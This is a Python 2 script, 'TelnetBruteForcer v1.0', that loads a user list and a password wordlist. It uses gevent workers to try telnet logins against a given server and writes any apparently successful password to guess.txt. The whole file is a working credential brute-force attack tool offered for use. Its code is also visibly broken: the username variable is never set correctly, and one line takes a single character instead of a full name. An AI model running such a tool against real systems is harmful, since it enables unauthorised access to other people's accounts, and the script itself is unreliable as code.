import gevent.monkey
import telnetlib
from gevent.queue import Queue, Empty
import gevent
import sys

gevent.monkey.patch_socket()

if len(sys.argv) != 4:
    print "Usage: ./telnetbrute.py <server> <userlist> <wordlist>"
    sys.exit(1)

try:
    users = open(sys.argv[2], "r").readlines()
except(IOError):
    print "Error: Check your userlist path\n"
    sys.exit(1)

try:
    words = open(sys.argv[3], "r").readlines()
except(IOError):
    print "Error: Check your wordlist path\n"
    sys.exit(1)

print "\n\t    TelnetBruteForcer v1.0"
print "\t--------------------------------------------------\n"
print "[+] Server:",sys.argv[1]
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words),"\n"


threads = []
tasks = Queue()
tasks1 = Queue()
user = ''

for usr in users:
    tasks1.put(usr)

def reloader():
    for word in words:
        tasks.put(word[:-1])
    user = tasks1.get()[0][:-1]
    print 'assign over!'

def worker(name):
    try:
        while True:
            try:
                value = tasks.get(timeout=1)
                #print "-"*12
                #print "User:",user,"Password:",value
                tn = telnetlib.Telnet(sys.argv[1])
                tn.read_until("login: ")
                tn.write(user + "\n")
                tn.read_until("Password: ")
                tn.write(value + "\n")
                result = tn.read_very_eager()
                while len(result) <= 2:
                    result = tn.read_very_eager()
                tn.close()
                print result, value
                if 'incorrect' not in result:
                    print "Login successful:", value, user
                    tasks._init(1)
                    fp = open('guess.txt', 'w')
                    fp.writelines(value + user)
                    fp.close()
                    sys.exit(2)
            except Empty:
                if tasks1.qsize() != 0:
                    reloader()
                raise Empty
            except:
                tasks.put(value)
                pass
    except Empty:
        pass


for i in xrange(1, 5):
    threads.append(gevent.spawn(worker, i))

reloader()
gevent.joinall(threads)

